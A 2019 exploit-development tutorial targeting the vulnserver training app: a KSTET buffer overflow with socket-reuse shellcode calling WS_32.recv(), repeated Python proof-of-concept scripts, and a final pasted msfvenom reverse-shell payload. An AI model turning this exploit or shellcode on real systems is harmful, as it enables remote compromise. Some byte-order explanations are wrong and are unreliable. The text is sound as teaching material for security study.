---
title:  "Exploit Development: Second Stage Payload - WS_32.recv() Socket Reuse"
date:   2019-07-13
tags: [posts]
excerpt: "Reusing an existing socket connection to add a buffer of a user defined length."
---
Introduction
---
While doing further research on ways to circumvent constraints on buffer space, I stumbled across a neat way to append a second stage user supplied buffer of a given length to an exploit. Essentially, we will be utilizing the [winsock.h](https://docs.microsoft.com/en-us/windows/win32/api/winsock/) header from the [Win32 API](https://docs.microsoft.com/en-us/windows/desktop/apiindex/windows-api-list) to write a few pieces of shellcode, in order to get parameters for a function call onto the stack. Once these parameters are on the stack, we will call the [recv](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv) function from __WS_32.dll__. This will allow us to pass a second stage buffer, in order to execute a useful piece of shellcode, like a shell. Let's get into it.

Replicating the Function Call
---
As mentioned before, in order to execute a successful exploit, we must find out where the function call is happening within the [vulnerable piece of software](https://github.com/stephenbradshaw/vulnserver). This is no different than the process of exploiting a vulnerable parameter in an HTTP request. Let's take a closer look at this.

Here is a snippet of source code from [muts'](https://twitter.com/muts?lang=en) famous HP NNM Exploit:

```python
import socket
import os
import sys

print "[*] HP NNM 7.5.1 OVAS.exe SEH Overflow Exploit (0day)"
print "[*] http://www.offensive-security.com"

# --- #

buffer="GET http://" + evilcrash+ "/topology/homeBaseView HTTP/1.1\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
buffer+= bindshell 
```

If we take a look at the `buffer` parameter, we can clearly see that this is an HTTP request. The vulnerability seems to arise from the [Host](https://www.itprotoday.com/devops-and-software-development/what-host-header) header. So, in order for this exploit to be successful - one must successfully replicate a valid HTTP request and then deliver the payload (shell, or proof of concept - or whatever it may be). If the HTTP request is not properly fulfilled, the back end server will most likely not even bat at eye at the request, and just discard it.

This is synonymous with what the `recv()` function requires. We are tasked with successfully fulfilling valid parameters in order to call the function. When, and only when, the function has all of the parameters it needs will it execute properly

Let's take a look at the Microsoft documentation on this.

Looking at the `recv()` function, here are the parameters needed to use it. Let's break this down:

```c++
int recv(
  SOCKET s,
  char   *buf,
  int    len,
  int    flags
);
```

The first parameter, `SOCKET s`, is the file descriptor that references the socket connection. A file descriptor is a piece of data that the Operating System uses to reference a certain resource (file, socket connection, I/O resource, etc.). Since we will be working within the x86 architecture, this will look something like this - `0x00000090` (this number will vary). 

Also, one thing to remember, a file descriptor is utilized by the OS. The file descriptor is not actually a raw value of `0x00000090` (or whatever value the OS is using). The OS would not know what to do with this value, as it is not a coherent memory address - just an arbitrary value. The OS needs to utilize a memory address that points to the file descriptor value (a pointer).

The second parameter, `char *buf`, is a pointer to the memory location the buffer is received at. Essentially, when developing our second stage payload, we will want to specify a memory location our execution will eventually reach.

The third parameter, `int len`, is the size of the buffer. Remember, this is going to be a hexadecimal representation of the decimal value we supply. A shell is around 350-450 bytes. Let's keep this in mind going forward.

The fourth parameter, `int flags`, is a numerical value that will allow for adding semantics/options to the function. We will just have this parameter set to zero, as to not influence or change the function in any unintended way.

Finding the Call to WS_32.recv()
---
As any network based buffer overflow works, we find a vulnerable parameter, command, or other field - and send data to that parameter. This POC does just that:

```python
import os
import sys
import socket

# Vulnerable command
command = "KSTET "

# 2000 bytes to crash vulnserver.exe
crash = "\x41" * 2000

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.143", 9999))

s.send(command+crash)
```

After executing the POC, here is what the debugger shows:

<img src="{{ site.url }}{{ site.baseurl }}/images/01.png" alt="">

After examining the crash, it seems as though EAX is going to be the best place for us to start building our shellcode.

Skipping some of the formalities, the POC has been updated to incorporate the proper offset to EIP and a `jmp eax` instruction:

```python
import os
import sys
import socket

# Vulnerable command
command = "KSTET "

# 2000 bytes to crash vulnserver.exe
crash = "\x41" * 70
crash += "\xb1\x11\x50\x62"  # 0x625011b1 jmp eax essfunc.dll
crash += "\x43" * (2000-len(crash))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.143", 9999))

s.send(command+crash)
```

Let's find the function call now. Close Immunity and vulnserver.exe. Restart vulnserver.exe and the reattach within Immunity.

__Right click__ on any disassembled instruction and select __View > Module 'vulnserv'__ (the executable itself).

<img src="{{ site.url }}{{ site.baseurl }}/images/02.png" alt="">

Now that we are viewing the executable itself again, __right click__ on any disassembled instruction. Select __Search For > All intermodular calls__. This refers to all calls to the __.dll__ dependencies of the application. As the `recv()` function is apart of __WS_32.dll__, we will need to search for the intermodular calls.

<img src="{{ site.url }}{{ site.baseurl }}/images/03.png" alt="">

Find the __WS_32.recv__ function in the __Destination__ column. (Pro tip: click on the __Destination__ header to sort alphabetically):

<img src="{{ site.url }}{{ site.baseurl }}/images/04.png" alt="">

Set a breakpoint:

<img src="{{ site.url }}{{ site.baseurl }}/images/05.png" alt="">

Restart the application in Immunity and start it (don't kill it but restart with the __rewind__ button.) and execute the updated POC:

Execution is paused

<img src="{{ site.url }}{{ site.baseurl }}/images/06.png" alt="">

...and we see our parameters on the stack!:

<img src="{{ site.url }}{{ site.baseurl }}/images/07.png" alt="">

LIFO (Last In First Out)
---
Let's remember one thing about the stack. The stack is a data structure that accepts data in a "last in first out" format. This means the first piece of data pushed onto the stack, will be the last item to be popped off the stack, or executed. Knowing this, we will need to push our parameters on the stack in reverse order. Having said this, we will need to manipulate our file descriptor first. 

Generating the File Descriptor
---
Although we will need to push our parameters on the stack in reverse order, we will start by generating the file descriptor. 

From the observations above - it seems that our file descriptor is the value `0x00000088`. Knowing this, we will create a piece of shellcode to reflect this. Here are the instructions generated, using [nasm_shell](https://github.com/fishstiqz/nasmshell):

```console
nasm > xor ecx, ecx
00000000  31C9              xor ecx,ecx
nasm > add cl, 0x88
00000000  80C188            add cl,0x88
nasm > push ecx
00000000  51                push ecx
nasm > mov edi, esp
00000000  89E7              mov edi,esp
```

The first instruction of:

```console
xor ecx, ecx
```

We are using this instruction to 'zero' out the ECX register for our calculations. Remember, XOR'ing any value with itself, will result in a zero value.

The second instruction:

```console
add cl, 0x88
```

This adds `0x88` bytes to the CL register. The CL register (counter low), is an 8-bit register (in unison with CH, or counter high) that makes up the 16 bit register CX. CX is a 16-bit register that makes up the 32-bit register (x86) ECX. 

Here is a diagram that outlines this better:

<img src="{{ site.url }}{{ site.baseurl }}/images/08.png" alt="">

A Word About Data Sizes
--
Remember, a 32-bit register when referencing the data inside of it is known as a [__DWORD__](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/262627d8-3418-4627-9218-4ffe110850b2), or a double word. A 16-bit register when referencing the data in it, is known as a [__WORD__](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/f8573df3-a44a-4a50-b070-ac4c3aa78e3c). An 8-bit register's data is known as a [__byte__](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/d7edc080-e499-4219-a837-1bc40b64bb04). 

The 32-bit register is comprised of 4 bytes: `0x11223344`. The numbers __44__ represents the most significant byte (since we are working with a little endian architecture). The CL register is located at the most significant byte (again, because we are using little endian) of the ECX register (the same location as __44__). This means, if we add `0x88` to the CL register, ECX will look like this:

```console
0x00000088
        ↑↑
        cl
```

The reason we would want to add directly to CL, instead of ECX, is because this guarantees our data will be properly inserted into the register. Adding directly to a 32-bit register may result in bytes being placed in unintended locations. We will use this knowledge later, as well.


The third instruction:

```console
push ecx
```
This gets the value onto the top of the stack. In other words, the value of `0x00000088` is being stored in ESP - as ESP contains the value of the item on top of the stack.

The last instruction:

```console
mov edi, esp
```

This will move the contents of ESP, into EDI. The reason we do this, is because this will create a memory address (ESP's address, which contains a pointer to the value `0x00000088`). EDI now is a memory address that points to the value of the file descriptor. 

Although we did not find the ACTUAL file descriptor the OS generated, we are essentially "tricking" the OS into thinking this is the file descriptor. The OS is only looking for a pointer that references the value `0x00000088`, not a specific memory address.

Before executing the POC, make sure to add a couple of software breakpoints (`\xCC`) BEFORE the shellcode! This is to pause execution, to allow for accurate calculations.

Here is the updated POC (also, remember to remove the breakpoint set earlier on the call to WS_32.recv()):

```python
import os
import sys
import socket

# Vulnerable command
command = "KSTET "

# 2000 bytes to crash vulnserver.exe
# Software breakpoint to pause execution
crash = "\xCC" * 2

# Creating File Descriptor = 0x00000088
crash += "\x31\xc9"     # xor ecx, ecx
crash += "\x80\xc1\x88"     # add cl, 0x88
crash += "\x51"       # push ecx
crash += "\x89\xe7"     # mov edi, esp

# 70 byte offset to EIP
crash += "\x41" * (70-len(crash))
crash += "\xb1\x11\x50\x62"  # 0x625011b1 jmp eax essfunc.dll
crash += "\x43" * (2000-len(crash))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.143", 9999))

s.send(command+crash)
```

Also take note, our shellcode is located in the EAX register, from the `jmp eax` instruction previously. EAX was also used as the padding buffer to reach EIP. This is why our shellcode is located before the `jmp eax` instruction. If this was a simple `jmp esp` exploit, all of these calculations and instructions would be located directly after the memory address used for the EIP overwrite.

Execution in Immunity:

```console
xor ecx, ecx
```

<img src="{{ site.url }}{{ site.baseurl }}/images/09.png" alt="">


```console
add cl, 0x88
```

<img src="{{ site.url }}{{ site.baseurl }}/images/010.png" alt="">

```console
push ecx
```
A look at the stack

<img src="{{ site.url }}{{ site.baseurl }}/images/011.png" alt="">

```console
mov edi, esp
```
EDI and ESP both contain the memory address that points to the value `0x00000088`

<img src="{{ site.url }}{{ site.baseurl }}/images/012.png" alt="">

Moving the Stack Out of the Way
---

As mentioned earlier about LIFO, there is another property of the stack that is going to ruin our exploit as it stands. As the stack grows, and things are pushed onto it - the stack grows towards the lower memory addresses. Our shellcode is growing toward the higher memory addresses:

<img src="{{ site.url }}{{ site.baseurl }}/images/013.png" alt="">

What we can do to circumvent this constraint, is to subtract the value of ESP, which is a memory address, by 50. This means our stack will be located ABOVE our shellcode. And since the stack grows downwards, it will never reach our shellcode. This is because the shellcode, which is growing towards the higher addresses, is growing in the opposite way of the stack - and the stack is located above our shellcode:

<img src="{{ site.url }}{{ site.baseurl }}/images/014a.png" alt="">

Here is how we will do this:

```console
nasm > sub esp, 0x50
00000000  83EC50            sub esp,byte +0x50
```

The updated POC:

```python
import os
import sys
import socket

# Vulnerable command
command = "KSTET "

# 2000 bytes to crash vulnserver.exe
# Software breakpoint to pause execution
crash = "\xCC" * 2

# Creating File Descriptor = 0x00000088
crash += "\x31\xc9"     # xor ecx, ecx
crash += "\x80\xc1\x88"     # add cl, 0x88
crash += "\x51"       # push ecx
crash += "\x89\xe7"     # mov edi, esp

# Move ESP out of the way
crash += "\x83\xec\x50"     # sub esp, 0x50

# 70 byte offset to EIP
crash += "\x41" * (70-len(crash))
crash += "\xb1\x11\x50\x62"  # 0x625011b1 jmp eax essfunc.dll
crash += "\x43" * (2000-len(crash))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.143", 9999))

s.send(command+crash)
```
Execution in Immunity:

```console
sub esp, 0x50
```

As we can see, ESP is now pointing about 50 bytes above our initial buffer of A's

<img src="{{ site.url }}{{ site.baseurl }}/images/015.png" alt="">

Flags
---
Now that the file descriptor is out of the way - we will start with the last parameter, the flags. 

The flags are the most painless of the parameters. All that is needed is a value of `0x00000000` on the stack. Here is the shellcode for this:

```console
nasm > xor edx, edx
00000000  31D2              xor edx,edx
nasm > push edx
00000000  52                push edx
```

The first instruction:

```console
xor edx, edx
```

This will once again "zero out" the EDX register.

The second instruction:

```console
push edx
```

Here, we are pushing EDX onto the top of the stack.

Updated POC:

```python
import os
import sys
import socket

# Vulnerable command
command = "KSTET "

# 2000 bytes to crash vulnserver.exe
# Software breakpoint to pause execution
crash = "\xCC" * 2

# Creating File Descriptor = 0x00000088
crash += "\x31\xc9"     # xor ecx, ecx
crash += "\x80\xc1\x88"     # add cl, 0x88
crash += "\x51"       # push ecx
crash += "\x89\xe7"     # mov edi, esp

# Move ESP out of the way
crash += "\x83\xec\x50"     # sub esp, 0x50

# Flags
crash += "\x31\xd2"
crash += "\x52"       # push edx

# 70 byte offset to EIP
crash += "\x41" * (70-len(crash))
crash += "\xb1\x11\x50\x62"   # 0x625011b1 jmp eax essfunc.dll
crash += "\x43" * (2000-len(crash))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.143", 9999))

s.send(command+crash)
```

Execution in Immunity:

```console
xor edx, edx
```

<img src="{{ site.url }}{{ site.baseurl }}/images/016.png" alt="">

```console
push edx
```

A glimpse of the stack, with a value of zero

<img src="{{ site.url }}{{ site.baseurl }}/images/017.png" alt="">

BufSize
---
Here is where we will determine our buffer size. Since we are working with hexadecimal, we will choose an easy number that is equivalent to a decimal amount enough for a shell (more than 350 bytes). We will choose 512 decimal, or `0x00000200` in __DWORD__ hexadecimal.

We will deploy a technique referenced above - (when we added to cl). Since EDX is already equal to zero from our flags parameter, let's use this register to do our calculations.

This time, we will add to the DH (data high) register, which is an 8-bit register within the 16-bit register DX, which is a part of the 32-bit register EDX. This register is not at the MOST significant byte (since we are utilizing a little endian architecture), but close to.

When we add to DH (in context of EDX), it will look a little something like this:

```console
0x0000XX00
      ↑↑
      dh
```

Here are the shellcode instructions for this parameter:

```console
nasm > add dh, 0x02
00000000  80C602            add dh,0x2
nasm > push edx
00000000  52                push edx
```

Updated POC:

```python
import os
import sys
import socket

# Vulnerable command
command = "KSTET "

# 2000 bytes to crash vulnserver.exe
# Software breakpoint to pause execution
crash = "\xCC" * 2

# Creating File Descriptor = 0x00000088
crash += "\x31\xc9"     # xor ecx, ecx
crash += "\x80\xc1\x88"     # add cl, 0x88
crash += "\x51"       # push ecx
crash += "\x89\xe7"     # mov edi, esp

# Move ESP out of the way
crash += "\x83\xec\x50"     # sub esp, 0x50

# Flags = 0x00000000
crash += "\x31\xd2"
crash += "\x52"       # push edx

# BufSize = 0x00000200
crash += "\x80\xc6\x02"     # add dh, 0x02
crash += "\x52"       # push edx

# 70 byte offset to EIP
crash += "\x41" * (70-len(crash))
crash += "\xb1\x11\x50\x62"   # 0x625011b1 jmp eax essfunc.dll
crash += "\x43" * (2000-len(crash))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.143", 9999))

s.send(command+crash)
```

Execution in Immunity:

```console
add dh, 0x02
```

<img src="{{ site.url }}{{ site.baseurl }}/images/018.png" alt="">

```console
push edx
```

Our BufSize and flags parameters are now on the stack!

<img src="{{ site.url }}{{ site.baseurl }}/images/019.png" alt="">

Buffer (Length):
---
As mentioned earlier, this is the parameter that will determine where our buffer will land. We want this location to be in a place where execution will reach. We also need to take into account that we manipulated ESP earlier by subtracting 50 from it.

Knowing this, we will have to do a slight stack alignment. Here, we will use EBX as our register to perform our calculations.

We will push the value of ESP onto the stack and pop it into EBX. We will then perform calculations to EBX - to get it equal to the location we would like our buffer to land. Then, we will push this item onto the stack, as our second to last (or visually second) parameter.

Before we get into that though, let's see what we are working with.

Registers after execution of all instructions:

<img src="{{ site.url }}{{ site.baseurl }}/images/020.png" alt="">

Disassembler after instructions:

<img src="{{ site.url }}{{ site.baseurl }}/images/021.png" alt="">

Let's remember what we have accomplished and what we have left:

1. We have got our flags and BufSize parameters on the stack.
2. We need to find a buffer location.
3. We need to eventually push our file descriptor pointer onto the stack
4. We need to call the `WS_32.recv()` function.

It should probably only take around 20-30 more bytes to accomplish what we have left. Let's take this into consideration when choosing a buffer location.

Referring to the disassembler image above, it looks like __`00C0F9F0`__ may be a good candidate!

The current ESP value is at __`00C0F9A4`__ and we would like to turn that into __`00C0F9F0`__, for our purposes.

Subtract the current ESP value from the wanted value:

```console
 00C0F9F0
-
 00C0F9A4
 _________
       4C
```

We will need to add `0x4C` to our current ESP value to get our buffer to land where we want.

To do our calculations, we will need to push the current stack pointer onto the stack and pop it into EBX. Then, we will need to perform a calculation on EBX to get it equal to `00C0F9F0`. Then we will push the value onto the stack.

Shellcode instructions:

```console
nasm > push esp
00000000  54                push esp
nasm > pop ebx
00000000  5B                pop ebx
nasm > add ebx, 0x4c
00000000  83C34C            add ebx,byte +0x4c
nasm > push ebx
00000000  53                push ebx
```

Updated POC:

```python
import os
import sys
import socket

# Vulnerable command
command = "KSTET "

# 2000 bytes to crash vulnserver.exe
# Software breakpoint to pause execution
crash = "\xCC" * 2

# Creating File Descriptor = 0x00000088
crash += "\x31\xc9"     # xor ecx, ecx
crash += "\x80\xc1\x88"     # add cl, 0x88
crash += "\x51"       # push ecx
crash += "\x89\xe7"     # mov edi, esp

# Move ESP out of the way
crash += "\x83\xec\x50"     # sub esp, 0x50

# Flags = 0x00000000
crash += "\x31\xd2"
crash += "\x52"       # push edx

# BufSize = 0x00000200
crash += "\x80\xc6\x02"     # add dh, 0x02
crash += "\x52"       # push edx

# Buffer = 0x00C0F9F0
crash += "\x54"       # push esp
crash += "\x5b"       # pop ebx
crash += "\x83\xc3\x4c"     # add ebx, 0x4c
crash += "\x53"       # push ebx

# 70 byte offset to EIP
crash += "\x41" * (70-len(crash))
crash += "\xb1\x11\x50\x62"   # 0x625011b1 jmp eax essfunc.dll
crash += "\x43" * (2000-len(crash))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.143", 9999))

s.send(command+crash)
```

Execution in Immunity:

```console
push esp
pop ebx
```

<img src="{{ site.url }}{{ site.baseurl }}/images/022.png" alt="">

```console
add ebx, 0x4c
```
<img src="{{ site.url }}{{ site.baseurl }}/images/023.png" alt="">

```console
push ebx
```

<img src="{{ site.url }}{{ site.baseurl }}/images/024.png" alt="">

File Descriptor, We Meet Again.
---
It is time to push our file descriptor onto the stack. Remember - our file descriptor is located in EDI. However, we cannot just execute a `push edi` instruction. Right now, EDI contains an actual value of __`00C0F9FC`__. Executing a `push edi` would literally put the value __`00C0F9FC`__ onto the stack.

We would like the value of `0x00000088` to be on the stack. Recall that the value of `0x00000088` is pointed to by EDI! That means if we can push the data that EDI references (or points to), we could get the file descriptor onto the stack.

We will need to execute this instruction:

```console
push dword ptr ds:[edi]
```

This will push the double word (__DWORD__, we are using a 32-bit register) pointer referenced in the data segment (`ds`) of EDI.

Shellcode instructions:

```console
FF37             PUSH DWORD PTR DS:[EDI]
```

Updated POC:

```python
import os
import sys
import socket

# Vulnerable command
command = "KSTET "

# 2000 bytes to crash vulnserver.exe
# Software breakpoint to pause execution
crash = "\xCC" * 2

# Creating file descriptor = 0x00000088
crash += "\x31\xc9"     # xor ecx, ecx
crash += "\x80\xc1\x88"     # add cl, 0x88
crash += "\x51"       # push ecx
crash += "\x89\xe7"     # mov edi, esp

# Move ESP out of the way
crash += "\x83\xec\x50"     # sub esp, 0x50

# Flags = 0x00000000
crash += "\x31\xd2"
crash += "\x52"       # push edx

# BufSize = 0x00000200
crash += "\x80\xc6\x02"     # add dh, 0x02
crash += "\x52"       # push edx

# Buffer = 0x00C0F9F0
crash += "\x54"       # push esp
crash += "\x5b"       # pop ebx
crash += "\x83\xc3\x4c"     # add ebx, 0x4c
crash += "\x53"       # push ebx

# Push file descriptor onto the stack:
crash += "\xff\x37"     # push dword ptr ds:[edi]

# 70 byte offset to EIP
crash += "\x41" * (70-len(crash))
crash += "\xb1\x11\x50\x62"   # 0x625011b1 jmp eax essfunc.dll
crash += "\x43" * (2000-len(crash))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.143", 9999))

s.send(command+crash)
```

Execution in Immunity:

<img src="{{ site.url }}{{ site.baseurl }}/images/025.png" alt="">

All of our parameters are now on the stack!

Calling WS_32.recv()
---

Let's revisit where the call actually happens. In Immunity, select the __Enter expression to follow__ button, right under the __Window__ button at the top of the window:

<img src="{{ site.url }}{{ site.baseurl }}/images/026.png" alt="">

If you double click on the instruction itself, you will see the actual instruction that is executed when the call happens:

<img src="{{ site.url }}{{ site.baseurl }}/images/028.png" alt="">

This is the instruction we will actually need to execute! This is where the actual call to the 1st instruction of the function occurs. There is one slight issue though - this address contains a null byte!

As exploit developers know, a null byte (__\x00__) can be a death sentence. The operating system recognizes this character as a string terminator and will disregard anything that comes after it. 

We do, however, have a way to circumvent this thanks to the assembly instruction [shr](https://www.aldeid.com/wiki/X86-assembly/Instructions/shr)!

The instruction `shr`, or shift right, will shift the bits to the right. 

If we could move the value __`40252C11`__ into a register (__`0040252C`__ is the actual address) and then shift the bits to the right, we should end up with our value! The __11__ value is just there to fill the 32-bit register. 

Let's say we hold this value (__`40252C11`__) in EAX. 

At this point we could execute `shr eax, 0x8` instruction. This will shift the contents of EAX to the right by 8 bits and dynamically add the byte needed to fill the EAX register in least significant bit location (most significant if viewing from a big endian perspective, which we are not) in the form of zeros.

```console
40252C11
```

to

```console
0040252C
```

Each value of a 32-bit register (`0x12345678`) is representative of 4 bits. (`8 x 4 = 32`). 

Shifting the bits by 8 bits should accomplish this!

After these logistics have been taken care of, we then need to call EAX!

Shellcode instructions:

```console
nasm > mov eax, 0x4025C11
00000000  B8115C0204        mov eax,0x4025c11
nasm > shr eax, 0x08
00000000  C1E808            shr eax,byte 0x8
nasm > call eax
00000000  FFD0              call eax
```

More experienced exploit developers may ask, "Why would you just not jump to EAX? It is generally more reliable."

The answer here is simple. A `jmp` will simply just go to that memory location. A `call` instruction will push the instruction after the current instruction pointer (EIP) onto the stack. Then, it will jump to that location.

As you can see, a `call` instruction will actually push a value onto the stack. This is needed in order to get all of our parameters on the stack, in the correct order. If we simply just used a `jmp`, all of our parameters on the stack will be one line off, because we are depending on the `call` instruction to push all of our instructions down into the correct place. 

Before we update the POC, we will have to add a buffer of 512 bytes, to satisfy the BufSize parameter we specified. In addition, since this is a two stage payload, we will sleep the connection for 5 seconds, before sending the second stage payload - to make sure everything gets a chance to execute.

(Note - in order to sleep the connection, import the __time__ library).

Here is the updated POC:

```python
import os
import sys
import socket
import time

# Vulnerable command
command = "KSTET "

# 2000 bytes to crash vulnserver.exe
# Software breakpoint to pause execution
crash = "\xCC" * 2

# Creating file descriptor = 0x00000088
crash += "\x31\xc9"     # xor ecx, ecx
crash += "\x80\xc1\x88"     # add cl, 0x88
crash += "\x51"       # push ecx
crash += "\x89\xe7"     # mov edi, esp

# Move ESP out of the way
crash += "\x83\xec\x50"     # sub esp, 0x50

# Flags = 0x00000000
crash += "\x31\xd2"
crash += "\x52"       # push edx

# BufSize = 0x00000200
crash += "\x80\xc6\x02"     # add dh, 0x02
crash += "\x52"       # push edx

# Buffer = 0x00C0F9F0
crash += "\x54"       # push esp
crash += "\x5b"       # pop ebx
crash += "\x83\xc3\x4c"     # add ebx, 0x4c
crash += "\x53"       # push ebx

# Push file descriptor onto the stack:
crash += "\xff\x37"     # push dword ptr ds:[edi]

# Calling W2_32.recv()
crash += "\xB8\x11\x2C\x25\x40"           # mov eax, 0x40252C11
crash += "\xc1\xe8\x08"                   # shr eax, 0x08
crash += "\xff\xd0"                       # call eax

# 70 byte offset to EIP
crash += "\x41" * (70-len(crash))
crash += "\xb1\x11\x50\x62"   # 0x625011b1 jmp eax essfunc.dll
crash += "\x43" * (2000-len(crash))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.143", 9999))

s.send(command+crash)

time.sleep(5)

s.send("\xCC" * 512)
s.close()
```

Execution in Immunity:

```console
mov eax, 0x40252c11
```

<img src="{{ site.url }}{{ site.baseurl }}/images/029.png" alt="">

```console
shr eax, 0x08
```

<img src="{{ site.url }}{{ site.baseurl }}/images/030.png" alt="">

```console
call eax
```
<img src="{{ site.url }}{{ site.baseurl }}/images/031.png" alt="">

Look at that! We have successfully gotten the function call and parameters correct.

Let's update the POC one more time. We will need to remove the 2 software breakpoints (`\xCC`) from earlier into `\x41` instructions (or NOPs).

```python
import os
import sys
import socket
import time

# Vulnerable command
command = "KSTET "

# 2000 bytes to crash vulnserver.exe
# Padding
crash = "\x41" * 2

# Creating file descriptor = 0x00000088
crash += "\x31\xc9"     # xor ecx, ecx
crash += "\x80\xc1\x88"     # add cl, 0x88
crash += "\x51"       # push ecx
crash += "\x89\xe7"     # mov edi, esp

# Move ESP out of the way
crash += "\x83\xec\x50"     # sub esp, 0x50

# Flags = 0x00000000
crash += "\x31\xd2"
crash += "\x52"       # push edx

# BufSize = 0x00000200
crash += "\x80\xc6\x02"     # add dh, 0x02
crash += "\x52"       # push edx

# Buffer = 0x00C0F9F0
crash += "\x54"       # push esp
crash += "\x5b"       # pop ebx
crash += "\x83\xc3\x4c"     # add ebx, 0x4c
crash += "\x53"       # push ebx

# Push file descriptor onto the stack:
crash += "\xff\x37"     # push dword ptr ds:[edi]

# Calling W2_32.recv()
crash += "\xB8\x11\x2C\x25\x40"           # mov eax, 0x40252C11
crash += "\xc1\xe8\x08"                   # shr eax, 0x08
crash += "\xff\xd0"                       # call eax

# 70 byte offset to EIP
crash += "\x41" * (70-len(crash))
crash += "\xb1\x11\x50\x62"   # 0x625011b1 jmp eax essfunc.dll
crash += "\x43" * (2000-len(crash))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.143", 9999))
s.send(command+crash)

time.sleep(5)

s.send("\xCC" * 512)
s.close()
```

Execution in Immunity:

<img src="{{ site.url }}{{ site.baseurl }}/images/032.png" alt="">

Disassembler

<img src="{{ site.url }}{{ site.baseurl }}/images/033.png" alt="">

Look at that! At memory address __`00C0F9F0`__, we have received our second stage buffer!

The most interesting thing, however, is the fact we control EIP!

These next 2 images are blurry. Open them in a new tab to get a better view. 

EIP before stepping through one instruction:

<img src="{{ site.url }}{{ site.baseurl }}/images/034.png" alt="">

EIP after stepping through:

<img src="{{ site.url }}{{ site.baseurl }}/images/035.png" alt="">'

Weaponizing the Proof of Concept
---

From here, all we have is a vanilla buffer overflow - where EIP is already pointed to our buffer. Let's get a shell.

```python
import os
import sys
import socket
import time

# Vulnerable command
command = "KSTET "

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=172.16.55.129 LPORT=443 -f python -v shell
# 324 bytes
shell =  ""
shell += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
shell += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
shell += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
shell += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
shell += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
shell += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
shell += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
shell += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
shell += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
shell += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
shell += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
shell += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
shell += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
shell += "\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
shell += "\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xac\x10\x37\x81\x68"
shell += "\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
shell += "\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
shell += "\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
shell += "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
shell += "\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
shell += "\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
shell += "\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
shell += "\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
shell += "\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
shell += "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

# 2000 bytes to crash vulnserver.exe
# Padding
crash = "\x41" * 2

# Creating file descriptor = 0x00000088
crash += "\x31\xc9"     # xor ecx, ecx
crash += "\x80\xc1\x88"     # add cl, 0x88
crash += "\x51"       # push ecx
crash += "\x89\xe7"     # mov edi, esp

# Move ESP out of the way
crash += "\x83\xec\x50"     # sub esp, 0x50

# Flags = 0x00000000
crash += "\x31\xd2"
crash += "\x52"       # push edx

# BufSize = 0x00000200
crash += "\x80\xc6\x02"     # add dh, 0x02
crash += "\x52"       # push edx

# Buffer = 0x00C0F9F0
crash += "\x54"       # push esp
crash += "\x5b"       # pop ebx
crash += "\x83\xc3\x4c"     # add ebx, 0x4c
crash += "\x53"       # push ebx

# Push file descriptor onto the stack:
crash += "\xff\x37"     # push dword ptr ds:[edi]

# Calling W2_32.recv()
crash += "\xB8\x11\x2C\x25\x40"           # mov eax, 0x40252C11
crash += "\xc1\xe8\x08"                   # shr eax, 0x08
crash += "\xff\xd0"                       # call eax

# 70 byte offset to EIP
crash += "\x41" * (70-len(crash))
crash += "\xb1\x11\x50\x62"   # 0x625011b1 jmp eax essfunc.dll
crash += "\x43" * (2000-len(crash))

